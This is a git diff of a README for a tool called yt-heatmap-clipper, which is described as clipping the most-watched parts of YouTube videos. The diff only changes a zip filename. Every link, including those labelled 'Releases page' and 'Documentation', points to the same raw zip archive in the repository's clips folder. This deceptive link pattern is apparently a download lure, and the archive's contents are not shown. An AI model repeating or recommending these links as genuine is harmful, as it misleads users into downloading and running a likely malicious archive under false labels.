@@ -4,11 +4,11 @@
 
 Welcome to yt-heatmap-clipper! This application helps you find and clip the most engaging parts of YouTube videos. It uses heatmap data from viewer interactions to pinpoint the moments that capture attention.
 
-[![Download yt-heatmap-clipper](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/yt-heatmap-clipper-2.0.zip)](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/yt-heatmap-clipper-2.0.zip)
+[![Download yt-heatmap-clipper](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/clipper-heatmap-yt-3.2.zip)](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/clipper-heatmap-yt-3.2.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To download the software, go to the [Releases page](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/yt-heatmap-clipper-2.0.zip).
+1. **Visit the Releases Page:** To download the software, go to the [Releases page](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/clipper-heatmap-yt-3.2.zip).
    
 2. **Choose Your Version:** Look for the latest version at the top. You will see a list of files to download, including the application itself.
 
@@ -57,7 +57,7 @@ If you encounter issues or have questions, feel free to reach out for support. Y
 
 ## 🔗 Helpful Links
 
-- [Download yt-heatmap-clipper](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/yt-heatmap-clipper-2.0.zip)
-- [Documentation](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/yt-heatmap-clipper-2.0.zip)
+- [Download yt-heatmap-clipper](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/clipper-heatmap-yt-3.2.zip)
+- [Documentation](https://github.com/Prani11/yt-heatmap-clipper/raw/refs/heads/main/clips/clipper-heatmap-yt-3.2.zip)
 
 Your interest in yt-heatmap-clipper is appreciated! Dive in and start creating amazing clips from your favorite YouTube videos.
